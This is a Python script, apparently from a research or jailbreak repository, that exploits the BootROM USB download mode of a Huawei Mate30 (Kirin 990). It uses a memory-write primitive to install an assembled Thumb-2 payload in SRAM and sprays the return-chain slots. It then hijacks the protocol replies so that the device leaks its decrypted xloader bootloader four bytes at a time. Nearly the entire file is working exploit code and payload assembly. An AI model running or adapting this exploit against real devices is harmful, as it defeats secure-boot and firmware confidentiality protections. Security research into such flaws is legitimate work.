# -*- coding: utf-8 -*-
"""
readback_xloader.py — Mate30 (Kirin 990 4G) BD xloader 明文回读 · 交互式版
================================================================================
由实战验证的 readback_final_proven.py（2026-09-08 proven 配置）重构而来：
协议时序、payload 汇编、触发方式逐字节保留，仅重做了人机交互层
（阶段横幅 / 进度条 / 倒计时 / 逐步判定），并把机器相关路径全部移入 config.ini。

原理（详见 docs/06-bootrom-xloader-analysis.md 与 docs/05-xloader-arbitrary-read.md）:
  [BootROM] FRESH(07) 会话 → 喂 null.ktl 解密产物 @0x22000 → 线缆舞步(TP4009 OFF 3s ON)
            → BootROM 把 BD 官方包里的 sec_usb_xloader.img 解密运行
  [注入]    向 SRAM 0x5C400 安装 Thumb-2 回调 payload（CD 应答劫持 +
            0x5C730 分发器 + 0x5C800 向量表 + 0x5D3B4..FC 休眠返回链喷涂）
  [触发]    纯静默 150s x2（09-02 定律: 关串口 3s 无效，静默会弹出 usb3_reset）
  [收割]    喂 sec_usb_xloader.img @0x22000 → 设备端解密器原位解密 →
            回调把明文按 4B/次经 CD 应答送回主机 → 存为 xloader 明文

用法:
    python readback_xloader.py                 # 按 config.ini 跑（首轮等设备 600s）
    python readback_xloader.py --nowait        # 设备已就绪，等 30s 即可
    python readback_xloader.py --rounds 10     # 最多重试 10 轮（默认 40）
    python readback_xloader.py --config my.ini

依赖:
    pip install pyserial keystone-engine
    + 自备组件（见 README）: 官方 BD 固件包、Kirin-Tool 移植模块 kirin_loader.py
      （含 null.ktl 解密所需的密钥材料，出于合规不入本仓库）
"""
import argparse
import binascii
import configparser
import os
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from console_ui import make_ui

try:
    import serial
    import serial.tools.list_ports
except ImportError:
    print('缺少 pyserial: pip install pyserial')
    sys.exit(2)

ui = None  # main() 里初始化

# ---------------------------------------------------------------- 协议常量（proven 实证值，勿改）
USB_VID, USB_PID = 0x12D1, 0x3609        # 华为 USB Download Mode
CALLBACK = 0x5C400                        # 回调安装基址（SRAM）
G_PTR = 0x5C3FC                           # 全局读指针
G_MARK = 0x5C3F8                          # 标记字地址（自指）
DM_ADDR = 0x5C730                         # CD 分发器
VT_ADDR = 0x5C800                         # 向量表
INF_LOOP = 0x5C700                        # 死循环桩
ENTRY = CALLBACK | 1                      # Thumb 入口
SPRAY = list(range(0x5D3B4, 0x5D3FC, 4))  # 休眠返回链喷涂槽（4.08 配置唯一改动）
FRESH_MARK = bytes.fromhex('1f000000')    # BootROM FRESH 态 CD 应答
ARM_MARK = bytes.fromhex('ccba11ca')      # 回调已运行标记 (0xCA11BACC 小端出现)
ELF_MAGIC = bytes.fromhex('7f454c46')
READ_WORDS = 0x30000 // 4                 # xloader 明文 192KB
CHUNK = 1024

STUB_LOG = 'readback_xloader.log'


def log(m):
    ui.info(m)


def beep(f, ms):
    try:
        import winsound
        winsound.Beep(f, ms)
    except Exception:
        pass


# ---------------------------------------------------------------- 帧构造（与 proven 逐字节一致）
def crc16(d):
    return binascii.crc_hqx(d, 0).to_bytes(2, 'big')


def head(addr, n, ft=1):
    h = struct.pack('>BBBBII', 0xFE, 0, 0xFF, ft, n, addr)
    return h + crc16(h)


def data(seq, p):
    d = struct.pack('>BBB', 0xDA, seq & 0xFF, (~seq) & 0xFF) + p
    return d + crc16(d)


def tail(seq):
    d = struct.pack('>BBB', 0xED, seq & 0xFF, (~seq) & 0xFF)
    return d + crc16(d)


def cdq(seq):
    c = struct.pack('>BBB', 0xCD, seq & 0xFF, (~seq) & 0xFF)
    return c + crc16(c)


# ---------------------------------------------------------------- payload（proven 配置，勿改）
def build_payload():
    """组装回调 payload。proven 版: CB(0x915 中断号) + DM(快照标记/0x4EDC 分支) + VT。"""
    try:
        from keystone import Ks, KS_ARCH_ARM, KS_MODE_THUMB
    except ImportError:
        ui.error('缺少 keystone-engine: pip install keystone-engine')
        sys.exit(2)
    ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)

    CB = (
        "movw r0,#0xED08\nmovt r0,#0xE000\nmovw r1,#0xC800\nmovt r1,#5\nstr r1,[r0]\n"
        "movw r0,#0xEDFC\nmovt r0,#0xE000\nldr r1,[r0]\n"
        "movs r2,#1\nlsls r2,r2,#16\norrs r1,r1,r2\nstr r1,[r0]\n"
        "movw r0,#0x2008\nmovt r0,#0xE000\n"
        "movw r1,#0x0915\nmovt r1,#0x8000\nstr r1,[r0]\n"
        "movw r0,#0x200C\nmovt r0,#0xE000\n"
        "movw r1,#0x4EDD\nmovt r1,#0x4000\nstr r1,[r0]\n"
        "movw r0,#0x2000\nmovt r0,#0xE000\nmovs r1,#3\nstr r1,[r0]\n"
        "movw r0,#0x1E04\nmovt r0,#2\nmovw r1,#0xBACC\nmovt r1,#0xCA11\nstr r1,[r0]\n"
        "movs r0,#0\n"
        "movw r3,#0x959\nmovt r3,#0\nbx r3\n")
    cb_b = bytes(ks.asm(CB, CALLBACK)[0])

    DM = (
        "mov r0, sp\n"
        "ldr r1,[r0,#24]\nbic r1,r1,#1\n"
        "movw r2,#0x916\ncmp r1,r2\nbne chk4edc\n"
        "mov r4, sp\n"
        "ldr r1,[r4]\n"
        "movw r2,#0x1E04\nmovt r2,#2\nstr r1,[r2]\n"
        "movw r1,#0xDECD\nmovt r1,#0xDECD\nstr r1,[r2]\n"
        "movw r2,#0xC3FC\nmovt r2,#5\nmovw r3,#0x3000\nmovt r3,#2\nstr r3,[r2]\n"
        "movw r3,#0x959\nstr r3,[r4,#16]\n"
        "movw r3,#0x6AD\nmovt r3,#0\nstr r3,[r4,#24]\n"
        "movw r2,#0x1E04\nmovt r2,#2\nmovw r1,#0x6AD6\nmovt r1,#0x6AD6\nstr r1,[r2]\n"
        "b chk4done\n"
        "chk4edc:\nmovw r2,#0x4EDC\ncmp r1,r2\nbne unknown\n"
        "movw r1,#0xC3FC\nmovt r1,#5\nldr r2,[r1]\n"
        "movw r3,#0x2FF8\nmovt r3,#2\ncmp r2,r3\nblo noop\n"
        "ldr r3,[r2]\nstr r3,[r0]\n"
        "adds r2,#4\nstr r2,[r1]\n"
        "noop:\nmovw r3,#0x4EE7\nstr r3,[r0,#24]\nbx lr\n"
        "unknown:\nmovw r3,#0x4EE7\nstr r3,[r0,#24]\n"
        "chk4done:\n"
        "bx lr\n")
    dm_b = bytes(ks.asm(DM, DM_ADDR)[0])
    inf_loop = bytes(ks.asm('b .\n', INF_LOOP)[0])

    blob = bytearray(VT_ADDR + 0x40 - CALLBACK)
    blob[0:len(cb_b)] = cb_b
    blob[INF_LOOP - CALLBACK:INF_LOOP - CALLBACK + len(inf_loop)] = inf_loop
    blob[DM_ADDR - CALLBACK:DM_ADDR - CALLBACK + len(dm_b)] = dm_b
    inf = INF_LOOP | 1
    dmv = DM_ADDR | 1
    vt = [0x5D3FC] + [inf] * 11 + [dmv, inf, inf, inf]
    for i, w in enumerate(vt):
        struct.pack_into('<I', blob, VT_ADDR - CALLBACK + 4 * i, w)
    return bytes(blob)


# ---------------------------------------------------------------- 串口层
def find_port():
    try:
        for p in serial.tools.list_ports.comports():
            if p.vid == USB_VID and p.pid == USB_PID:
                return p.device
    except Exception:
        pass
    return None


def open_ser(port):
    try:
        s = serial.Serial(port, 115200, timeout=2, write_timeout=2, rtscts=True)
        s.dtr = True
        s.rts = True
        time.sleep(0.2)
        return s
    except Exception as e:
        ui.warn('打开 %s 失败: %s' % (port, e))
        return None


def wr(s, frame, nread=1, tmo=2.0):
    try:
        s.timeout = tmo
        s.write(frame)
        s.flush()
        return s.read(nread)
    except Exception:
        return b''


def drain(s):
    try:
        n = s.in_waiting
        if n:
            s.read(n)
    except Exception:
        pass


def session_start(s):
    raw = struct.pack('>BBBBII', 0xFE, 0, 0xFF, 1, 4, 0x22001)
    try:
        drain(s)
        s.timeout = 1.0
        s.write(raw + crc16(raw))
        s.flush()
        r = s.read(8)
        time.sleep(0.05)
        drain(s)
        return r
    except Exception:
        return b''


def cd_probe(s):
    return wr(s, cdq(1), 4, 2.0)


def wait_port(timeout_s, what='responsive port'):
    t0 = time.time()
    last = -99

    def poll():
        p = find_port()
        return '端口在位: %s' % p if p else '端口未出现（等待设备进入下载模式）'

    while time.time() - t0 < timeout_s:
        p = find_port()
        if p:
            try:
                s = serial.Serial(p, 115200, timeout=1.5, write_timeout=1, rtscts=True)
                s.dtr = True
                s.rts = True
                time.sleep(0.2)
                raw2 = struct.pack('>BBBBII', 0xFE, 0, 0xFF, 1, 4, 0x22001)
                s.write(raw2 + crc16(raw2))
                s.flush()
                r = s.read(8)
                s.close()
                if r:
                    return p
            except Exception:
                pass
        if time.time() - last > 15:
            ui.info('[等待] %s 未就绪 (%ds/%ds)' % (what, int(time.time() - t0), timeout_s))
            last = time.time()
        ui.countdown(what, min(10, timeout_s - (time.time() - t0)), poll=poll, tick=0.5)
    return None


def bug2_write(s, addr, val4, tries=3):
    """head 重发式任意写（无 tail）——BootROM 期唯一已验证写原语。"""
    for a in range(tries):
        drain(s)
        wr(s, head(0x22000, 4), 1, 2.0)
        time.sleep(0.05)
        wr(s, head(addr, 4), 0, 0.05)
        time.sleep(0.05)
        drain(s)
        r = wr(s, data(1, val4), 1, 2.0)
        if r and r[:1] == b'\xaa':
            return True
        time.sleep(0.2)
    return False


def upload_plain(s, blob, addr, name):
    ok = False
    for h in range(5):
        r = wr(s, head(addr, len(blob)), 1, 2.0)
        if r and r[:1] == b'\xaa':
            ok = True
            break
        ui.warn('%s head 重试 %d (应答 %s)' % (name, h + 1, r.hex() if r else 'none'))
        time.sleep(0.6)
    if not ok:
        ui.error('%s head 失败' % name)
        return False
    seq = 0
    off = 0
    bad = 0
    t0 = time.time()
    while off < len(blob):
        chunk = blob[off:off + 1024]
        seq += 1
        frame = data(seq, chunk)
        ack = wr(s, frame, 1, 2.0)
        if not ack or ack[:1] != b'\xaa':
            time.sleep(0.3)
            ack = wr(s, frame, 1, 2.0)
            if not ack or ack[:1] != b'\xaa':
                bad += 1
                if bad >= 5:
                    ui.error('%s 数据帧失败 @%d' % (name, off))
                    ui.progress_end()
                    return False
        off += len(chunk)
        rate = '%.0f B/s' % (off / max(time.time() - t0, 0.1))
        ui.progress(off, len(blob), label=name, rate=rate)
    wr(s, tail(seq + 1), 1, 2.0)
    ui.step(True, '%s 上传完成 (%d B)' % (name, len(blob)))
    return True


def fast_read(s, path, label):
    """收割循环: 每次发 CD 收 4B 明文，持续到 READ_WORDS 满。"""
    out = bytearray()
    got = 0
    bad = 0
    t0 = time.time()
    last_save = 0
    while got < READ_WORDS:
        try:
            s.write(cdq(1))
            s.flush()
        except Exception:
            ui.warn('%s: 串口写入异常' % label)
            break
        r = s.read(4)
        if len(r) < 4:
            bad += 1
            if bad > 12:
                ui.warn('%s: 连续无响应 @%d words，停止' % (label, got))
                break
            time.sleep(0.5)
            continue
        bad = 0
        out += r[:4]
        got += 1
        rate = '%.0f w/s' % (got / max(time.time() - t0, 0.001))
        ui.progress(got, READ_WORDS, label=label, rate=rate)
        if got - last_save >= 4096:
            with open(path, 'wb') as f:
                f.write(bytes(out))
            last_save = got
    with open(path, 'wb') as f:
        f.write(bytes(out))
    ui.step(True, '%s: 已保存 %d 字节 -> %s' % (label, len(out), path))
    return bytes(out)


# ---------------------------------------------------------------- 主流程
def dance(s, port, round_no, null_blob):
    """线缆舞步: null 下发后 TP4009 断开 3 秒再接通（物理操作，脚本只提示）。"""
    if not upload_plain(s, null_blob, 0x22000, 'null'):
        ui.error('R%d: null 下发失败' % round_no)
        return None
    ui.step(True, 'R%d: null 下发完成' % round_no)
    ui.warn('R%d: *** 请执行线缆舞步: TP4009 断开 3 秒后接通 ***' % round_no)
    beep(1200, 150)
    s.close()
    gone = False

    def poll_gone():
        return '端口仍在（等待断开 TP4009）' if find_port() else '端口已消失，等待回升'

    ui.countdown('等待端口消失', 120, poll=poll_gone, tick=1)
    gone = find_port() is None
    p = None
    if gone:
        ui.info('R%d: 端口已消失，等待回升...' % round_no)

        def poll_back():
            q = find_port()
            return '端口回升: %s' % q if q else '尚未回升（蜂鸣提示中）'

        ui.countdown('等待端口回升', 300, poll=poll_back, tick=1)
        for _ in range(300):
            p = find_port()
            if p:
                break
            if _ % 2 == 0:
                beep(1500, 120)
            time.sleep(1)
        if p is None:
            ui.error('R%d: 端口未回升' % round_no)
            return None
    else:
        p = port
        ui.warn('R%d: 端口未消失——按"未断开"路径继续' % round_no)
    s = open_ser(p)
    if s is None:
        return None
    drain(s)
    ui.step(True, 'R%d: 舞步完成 @%s' % (round_no, p))
    beep(2000, 300)
    return s


def try_round(round_no, cfg, blob, null_blob, bdimg, nowait, max_wait_first=600):
    port = wait_port(30 if (nowait or round_no > 1) else max_wait_first, 'responsive device')
    if not port:
        ui.error('R%d: 未发现可用设备' % round_no)
        return False
    ui.info('R%d: 串口 %s' % (round_no, port))
    s = open_ser(port)
    if s is None:
        return False
    drain(s)
    st = session_start(s)
    ui.info('R%d: session_start -> %s' % (round_no, st.hex() if st else '(none)'))
    r = cd_probe(s)
    fresh = (r == FRESH_MARK)
    ui.info('R%d: 状态 CD=%s -> %s' % (
        round_no, r.hex() if r else 'none',
        'FRESH（需要 null+舞步）' if fresh else '已舞步过（跳过 null）'))
    if fresh:
        s2 = dance(s, port, round_no, null_blob)
        if s2 is None:
            return False
        s = s2

    # ---- 安装 payload（逐字 bug2_write，3 次机会）----
    ok = False
    for attempt in range(3):
        good = True
        ui.info('R%d: 安装 payload（%d 字）' % (round_no, len(blob) // 4))
        for i in range(len(blob) // 4):
            c = bytes(blob[i * 4:i * 4 + 4])
            if not bug2_write(s, CALLBACK + i * 4, c):
                good = False
                ui.error('R%d: 安装失败 @word %d (0x%05X)' % (round_no, i, CALLBACK + i * 4))
                break
            ui.progress(i + 1, len(blob) // 4, label='install')
        if good and bug2_write(s, G_MARK, struct.pack('<I', 0xCA11BACC)) \
                and bug2_write(s, G_PTR, struct.pack('<I', G_MARK)):
            ok = True
            break
        ui.warn('R%d: 安装第 %d 遍失败——清缓冲重试' % (round_no, attempt + 1))
        drain(s)
        time.sleep(1)
    ui.progress_end()
    if not ok:
        ui.error('R%d: payload 安装失败' % round_no)
        s.close()
        return False
    ui.step(True, 'R%d: payload 已安装' % round_no)

    # ---- 喷涂休眠返回链 ----
    for slot in SPRAY:
        if not bug2_write(s, slot, struct.pack('<I', ENTRY)):
            ui.error('R%d: 喷涂失败 @0x%05X' % (round_no, slot))
            s.close()
            return False
    ui.step(True, 'R%d: 已喷涂 %d 个槽位' % (round_no, len(SPRAY)))

    # ---- 触发: 纯静默 150s x2（proven 定律: 关串口 3s 无效）----
    ui.warn('R%d: 触发方式: 纯静默 150s x2（保持线缆不动，不要碰设备）' % round_no)
    s.close()
    confirmed = False
    for cycle in range(2):
        t0 = time.time()
        gone_seen = False

        def poll_silence():
            nonlocal gone_seen
            if find_port() is None:
                if not gone_seen:
                    gone_seen = True
                return '端口已消失（usb3_reset 征兆）'
            if gone_seen:
                gone_seen = False
                return '端口已回升'
            return '静默等待中'

        ui.countdown('静默周期 %d/2' % (cycle + 1), 150, poll=poll_silence, tick=1)
        s = None
        for i in range(6):
            s = open_ser(port)
            if s is not None:
                break
            time.sleep(1)
        if s is None:
            ui.error('R%d: 静默周期 %d 后无法重开串口' % (round_no, cycle + 1))
            return False
        drain(s)
        r = cd_probe(s)
        ui.info('R%d: 静默后 CD=%s' % (round_no, r.hex() if r else 'none'))
        if r == ARM_MARK:
            ui.step(True, 'R%d: *** 回调已确认运行 ***' % round_no)
            confirmed = True
            break
        try:
            s.close()
        except Exception:
            pass
    if not confirmed:
        ui.warn('R%d: 回调未标记——按 04:18 先例继续（不中止）' % round_no)
        s = open_ser(port)
        if s is None:
            return False

    # ---- 喂 BD xloader → 设备端解密 ----
    if not upload_plain(s, bdimg, 0x22000, 'BD-xloader'):
        ui.error('R%d: BD 镜像下发失败' % round_no)
        s.close()
        return False
    ui.info('R%d: BD 已喂入——等待解密 + 端口重枚举（约 12s 后端口会消失）...' % round_no)
    time.sleep(12)
    try:
        s.close()
    except Exception:
        pass
    p = wait_port(240, 'post-decrypt recovery')
    if p is None:
        ui.error('R%d: 解密后端口丢失' % round_no)
        return False
    s = open_ser(p)
    if s is None:
        return False
    drain(s)
    ui.step(True, 'R%d: 端口已恢复 @%s' % (round_no, p))

    # ---- 探测明文信号 ----
    #   7f454c46 / 02002800 = 明文就绪
    #   ccba11ca = 回调跑了但 0x916 未触发
    #   00000000/无回复 = xloader 已接管或挂死
    got_plain = False
    for ip in range(24):
        r = cd_probe(s)
        if r and r[:1] != b'\x00':
            if r[:4] in (ELF_MAGIC, bytes.fromhex('02002800')):
                sig = '<<< 明文就绪!'
            elif r == ARM_MARK:
                sig = '(标记字, 0x916 未触发)'
            else:
                sig = '(状态字)'
            ui.info('R%d: 探测 %d = %s %s' % (round_no, ip + 1, r.hex(), sig))
            if r[:4] in (ELF_MAGIC, bytes.fromhex('02002800')):
                got_plain = True
                break
        time.sleep(0.4)
    if not got_plain:
        ui.error('R%d: 恢复后未出现明文信号' % round_no)
        try:
            s.close()
        except Exception:
            pass
        return False
    ui.step(True, 'R%d: *** 明文服务中——开始收割 ***' % round_no)
    bd = fast_read(s, cfg['dump_path'], 'xloader-plain')
    try:
        s.close()
    except Exception:
        pass
    if bd[:4] in (ELF_MAGIC, bytes.fromhex('02002800')) or bd[:1] == b'\x7f':
        ui.step(True, 'R%d: *** XLOADER 明文收割成功 ***' % round_no)
        return True
    ui.warn('R%d: 已保存 dump（可离线提取）' % round_no)
    return True


def load_config(path):
    cp = configparser.ConfigParser()
    cp.read(path, encoding='utf-8')
    bd_dir = cp.get('paths', 'bd_dir', fallback='').strip()
    out_dir = cp.get('paths', 'out_dir', fallback='').strip() or os.getcwd()
    port = cp.get('paths', 'port', fallback='').strip() or None
    kirin_dir = cp.get('paths', 'kirin_module_dir', fallback='').strip()
    if not bd_dir:
        ui.error('config 未配置 [paths] bd_dir（官方 BD 包的 bootloaderimage 目录）')
        sys.exit(2)
    return {
        'bdimg': os.path.join(bd_dir, 'sec_usb_xloader.img'),
        'out_dir': out_dir,
        'port': port,
        'kirin_dir': kirin_dir,
        'dump_path': os.path.join(out_dir, 'XLOADER_BD_PLAIN.bin'),
    }


def load_null(kirin_dir):
    """加载用户自备的 Kirin-Tool 移植模块（含密钥材料，不入仓库）。"""
    if not kirin_dir or not os.path.isdir(kirin_dir):
        ui.error('未配置 kirin_module_dir（Kirin-Tool 移植模块目录）')
        ui.error('该模块提供 dtl() 与 null.ktl 解密所需密钥，出于合规不在本仓库分发，')
        ui.error('请参考 README「自备组件」一节自行准备后，把目录写进 config.ini。')
        sys.exit(2)
    sys.path.insert(0, kirin_dir)
    try:
        import kirin_loader as K
    except ImportError as e:
        ui.error('在 %s 下找不到 kirin_loader.py: %s' % (kirin_dir, e))
        sys.exit(2)
    loader_dir = getattr(K, 'LOADER_DIR', kirin_dir)
    null = K.dtl(open(os.path.join(loader_dir, 'null.ktl'), 'rb').read())
    ui.step(True, 'null.ktl 解密完成: %d B' % len(null))
    return null


def main():
    global ui
    ap = argparse.ArgumentParser(description='Mate30 BD xloader 明文回读（交互式版）')
    ap.add_argument('--config', default=os.path.join(HERE, 'config.ini'))
    ap.add_argument('--nowait', action='store_true', help='设备已就绪: 首轮只等 30s')
    ap.add_argument('--rounds', type=int, default=40, help='最大重试轮数（默认 40）')
    a = ap.parse_args()

    if not os.path.exists(a.config):
        print('缺少配置文件 %s —— 请复制 config.example.ini 为 config.ini 并填写路径。' % a.config)
        return 2
    ui = make_ui(logfile=os.path.join(HERE, STUB_LOG))
    cfg = load_config(a.config)
    if not os.path.exists(cfg['bdimg']):
        ui.error('找不到 BD 镜像: %s' % cfg['bdimg'])
        return 2

    ui.banner('Mate30 xloader 明文回读（proven 配置重构版）')
    ui.info('BD 镜像 : %s' % cfg['bdimg'])
    ui.info('输出到  : %s' % cfg['dump_path'])
    ui.phase('准备 payload 与 null.ktl')
    blob = build_payload()
    ui.step(True, 'payload %d B 组装完成（cb@%05X dm@%05X vt@%05X）'
            % (len(blob), CALLBACK, DM_ADDR, VT_ADDR))
    null_blob = load_null(cfg['kirin_dir'])
    bdimg = open(cfg['bdimg'], 'rb').read()
    ui.step(True, 'BD 镜像读取: %d B' % len(bdimg))

    for rnd in range(1, a.rounds + 1):
        ui.phase('第 %d/%d 轮' % (rnd, a.rounds))
        try:
            if try_round(rnd, cfg, blob, null_blob, bdimg, a.nowait):
                ui.banner('=== 收割成功 ===')
                return 0
        except KeyboardInterrupt:
            ui.warn('用户中断——串口已尽可能关闭；设备断电重进下载模式可恢复')
            return 130
        except Exception as e:
            ui.error('R%d 异常: %r' % (rnd, e))
        ui.info('第 %d 轮失败，5 秒后重试' % rnd)
        time.sleep(5)
    ui.error('=== 全部 %d 轮失败 ===' % a.rounds)
    return 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print('\n已中断')
        sys.exit(130)
